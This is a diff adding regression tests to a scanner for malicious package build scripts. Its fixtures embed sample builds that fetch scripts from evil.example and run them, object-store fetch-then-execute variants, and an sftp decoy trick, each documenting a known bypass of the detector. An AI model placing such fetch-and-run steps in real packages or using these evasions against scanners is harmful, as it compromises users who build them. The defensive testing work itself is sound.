@@ -497,3 +497,330 @@ def test_no_matching_module_splits_lines_the_python_way():
         "these read attacker text and must use tokenizer.split_lines: "
         f"{offenders}"
     )
+
+
+# ---------------------------------------------------------------------------
+# Attempt 10: benign-name declared source executed (bypass c8c3e1b7)
+# ---------------------------------------------------------------------------
+
+#: ``source+=(http://evil.example/configure)`` with a matching checksum,
+#: then ``./configure`` in build().  H083's ``_H072_BENIGN_EXEC`` exemption
+#: treated the execution of a file fetched from an attacker host like an
+#: ordinary build step, so only SOURCE_BUCKET (20) fired - exactly the
+#: threshold, unflagged.
+ATTEMPT10 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.19.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+source=("git+${url}.git#commit=5555555555555555555555555555555555555555"
+        "http://evil.example/configure")
+sha256sums=('SKIP'
+            '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08')
+
+build() {
+  cd "$srcdir/$pkgname"
+  true && ./configure
+}
+
+package() {
+  cd "$srcdir/$pkgname"
+  install -Dm644 fonts.conf "${pkgdir}"/etc/fonts/conf.d/99-tweaks.conf
+}
+"""
+
+
+def test_attempt10_foreign_declared_source_benign_name_executed():
+    fact = _fact(ATTEMPT10)
+    assert "H083" in _rule_ids(fact)
+
+
+def test_attempt10b_sibling_upstream_source_stays_silent():
+    """A configure that genuinely comes from the upstream is not foreign.
+
+    The same execution shape with the build script hosted under the
+    package's own upstream domain must keep H083's ordinary benign-exec
+    exemption - the fix targets provenance, not the filename.
+    """
+    new = ATTEMPT10.replace(
+        '"http://evil.example/configure"',
+        '"https://github.com/example/fontconfig-tweaks/raw/main/configure"',
+    )
+    fact = _fact(new)
+    assert "H083" not in _rule_ids(fact)
+
+
+# ---------------------------------------------------------------------------
+# Attempt 11: fetch/exec chain split across the diff boundary (bypass
+# dbf38ba3)
+# ---------------------------------------------------------------------------
+
+_FETCH_BASE = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.20.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+
+build() {
+  cd "$srcdir/$pkgname"
+  curl -s http://evil.example/s.sh -o s.sh
+}
+"""
+
+#: The fetch sits unchanged on a context line; only ``bash s.sh`` is added
+#: (above the fetch, the order the bypass used).  Every pairing rule read
+#: added lines only, so the chain scored 5 (R010+W001).
+ATTEMPT11 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.20.1
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+
+build() {
+  cd "$srcdir/$pkgname"
+  bash s.sh
+  curl -s http://evil.example/s.sh -o s.sh
+}
+"""
+
+#: Mirror image: the execution is the pre-existing line and the fetch is
+#: what the diff adds.
+ATTEMPT11_MIRROR = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.20.1
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+
+build() {
+  cd "$srcdir/$pkgname"
+  bash s.sh
+  curl -s http://evil.example/s.sh -o s.sh
+}
+"""
+
+
+def test_attempt11_fetch_on_context_line_exec_added():
+    diff = _diff(_FETCH_BASE, ATTEMPT11)
+    fact = scan_diff(diff, package_name="fontconfig-tweaks",
+                     current_text=ATTEMPT11)
+    assert "H082" in _rule_ids(fact)
+
+
+def test_attempt11_mirror_exec_on_context_line_fetch_added():
+    base = _FETCH_BASE.replace(
+        "curl -s http://evil.example/s.sh -o s.sh\n", "bash s.sh\n")
+    diff = _diff(base, ATTEMPT11_MIRROR)
+    fact = scan_diff(diff, package_name="fontconfig-tweaks",
+                     current_text=ATTEMPT11_MIRROR)
+    assert "H082" in _rule_ids(fact)
+
+
+def test_attempt11_both_halves_preexisting_stays_silent():
+    """A version bump over an old fetch+exec pair is not a new chain."""
+    bumped = _FETCH_BASE.replace("pkgver=2.20.0", "pkgver=2.20.1")
+    diff = _diff(_FETCH_BASE, bumped)
+    fact = scan_diff(diff, package_name="fontconfig-tweaks",
+                     current_text=bumped)
+    assert "H082" not in _rule_ids(fact)
+
+
+# ---------------------------------------------------------------------------
+# Attempt 12: Backblaze CLI v1 spelling `b2 download` (client-list gap)
+# ---------------------------------------------------------------------------
+
+ATTEMPT12 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.21.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+
+build() {
+  cd "$srcdir/$pkgname"
+  b2 download bkt/s.py s.py
+  python3 s.py
+}
+"""
+
+
+def test_attempt12_b2_v1_download_spelling_pairs_with_execution():
+    fact = _fact(ATTEMPT12)
+    assert "H082" in _rule_ids(fact)
+
+
+# ---------------------------------------------------------------------------
+# Attempt 13: object-store client with a global option before the verb
+# (harness wave-3/5/evasion-matrix D family)
+# ---------------------------------------------------------------------------
+
+#: ``NETWORK_CLIENT_ALTERNATIVES`` required the download subcommand to be
+#: adjacent to the client.  A single global option between them left the
+#: fetch invisible: no client was recognised, so ``bash s.sh`` paired with
+#: nothing and the chain scored 0.  The store clients take global options
+#: before their verb, exactly like ``git -C`` already did.
+_D13 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.22.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+source=("git+${url}.git#commit=1111111111111111111111111111111111111111")
+sha256sums=('SKIP')
+
+build() {
+  cd "$srcdir/$pkgname"
+  @@FETCH@@
+  bash s.sh
+}
+"""
+
+
+@pytest.mark.parametrize("fetch", [
+    "rclone --limit-rate=1M copy r:s.sh s.sh",
+    "rclone -c x copyto r:s.sh s.sh",
+    "s3cmd -c sc get s3://b/s.sh s.sh",
+    "s3cmd --region=us get s3://b/s.sh s.sh",
+    "aws s3 --endpoint-url=http://x cp s3://b/s.sh s.sh",
+    "aws s3api --endpoint-url=http://x get-object --bucket b --key s.sh s.sh",
+    "gsutil -m cp gs://b/s.sh s.sh",
+    "gsutil -u p cp gs://b/s.sh s.sh",
+    "ipfs --api=/ip4/1.2.3.4/tcp/5001 get QmX -o s.sh",
+    "rados -p pool get obj s.sh",
+    "swift --os-auth-url=http://x download cont s.sh",
+])
+def test_attempt13_option_before_verb_still_pairs_fetch_with_execution(fetch):
+    fact = _fact(_D13.replace("@@FETCH@@", fetch))
+    assert "H082" in _rule_ids(fact)
+
+
+# ---------------------------------------------------------------------------
+# Attempt 14: foreign declared source, sibling/same-host/trusted-forge
+# (harness wave-4/6 evasion matrix)
+# ---------------------------------------------------------------------------
+
+#: The Attempt-10 fix exempted a declared build script when its host shared
+#: a registrable domain with a sibling source, matched the ``url=`` domain,
+#: or sat on a trusted forge.  Declaring *two* attacker-hosted scripts made
+#: one vouch for the other, and a ``github.com/evil`` path matched the
+#: upstream's ``github.com`` domain.  Only a source inside the upstream's
+#: own repository is exempt now.
+_D14 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.23.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+source=(@@SOURCES@@)
+sha256sums=(@@SUMS@@)
+
+build() {
+  cd "$srcdir/$pkgname"
+  ./configure
+}
+"""
+
+_ZERO = "'" + "0" * 64 + "'"
+
+
+@pytest.mark.parametrize("sources", [
+    # two attacker sources on one host: the sibling vouched for the payload
+    '"http://evil.example/a" "http://evil.example/configure"',
+    # a benign tarball and the script on the same attacker host
+    '"http://evil.example/b.tar.gz" "http://evil.example/configure"',
+    # trusted forge, different repository owner than the upstream
+    '"https://github.com/evil/configure"',
+    # trusted forge, different forge than the upstream
+    '"https://gitlab.com/evil/configure"',
+    # same registered domain, attacker subdomain
+    '"http://cdn.evil.example/configure"',
+])
+def test_attempt14_foreign_declared_build_script_is_executed(sources):
+    n = sources.count('"') // 2
+    new = _D14.replace("@@SOURCES@@", sources).replace("@@SUMS@@", " ".join([_ZERO] * n))
+    fact = _fact(new)
+    assert "H083" in _rule_ids(fact)
+
+
+def test_attempt14b_upstream_owned_build_script_stays_silent():
+    """A configure inside the upstream's own repository is still ordinary."""
+    new = _D14.replace(
+        "@@SOURCES@@",
+        '"https://github.com/example/fontconfig-tweaks/raw/main/configure"',
+    ).replace("@@SUMS@@", _ZERO)
+    fact = _fact(new)
+    assert "H083" not in _rule_ids(fact)
+
+
+# ---------------------------------------------------------------------------
+# Attempt 15: host-form fetch with a declared-URL decoy operand (reopened
+# bypass list2-b/987b9ebd, recorded against 0.17.2 and still scoring 0 at
+# 0.18.1)
+# ---------------------------------------------------------------------------
+
+_D15 = """# Maintainer: Jane Doe <jane@example.org>
+pkgname=fontconfig-tweaks
+pkgver=2.21.0
+pkgrel=1
+pkgdesc="Sensible font rendering tweaks for LCD panels"
+arch=('any')
+url="https://github.com/example/fontconfig-tweaks"
+license=('MIT')
+depends=('fontconfig')
+source=("https://github.com/example/fontconfig-tweaks/archive/v2.21.0.tar.gz")
+sha256sums=('1111111111111111111111111111111111111111111111111111111111111111')
+
+build() {
+  sftp -b - root@evil.example https://github.com/example/fontconfig-tweaks/archive/v2.21.0.tar.gz <<< "get /setup.py"
+  python3 setup.py build
+}
+"""
+
+
+def test_attempt15_host_form_fetch_with_declared_url_decoy_is_flagged():
+    """``sftp u@evil.example <declared URL>`` then ``python3 setup.py``.
+
+    The host-form operand is the real remote; the scheme URL is a decoy
+    argument naming a declared source.  ``fetch_addresses`` used to yield
+    the scheme address first, H016 compared it against ``source=()``, found
+    it declared, and stopped - the foreign host operand was never examined,
+    so the chain scored 0.
+    """
+    fact = _fact(_D15)
+    assert "H016" in _rule_ids(fact)
+
+
+def test_attempt15_upstream_host_form_fetch_stays_silent():
+    """The same spelling against the package's own host is ordinary.
+
+    ``sftp`` to the declared upstream with the declared tarball as an
+    argument names no foreign remote; the fix targets the decoy's
+    *attribution*, not the client.
+    """
+    new = _D15.replace("root@evil.example", "git@github.com")
+    fact = _fact(new)
+    assert "H016" not in _rule_ids(fact)
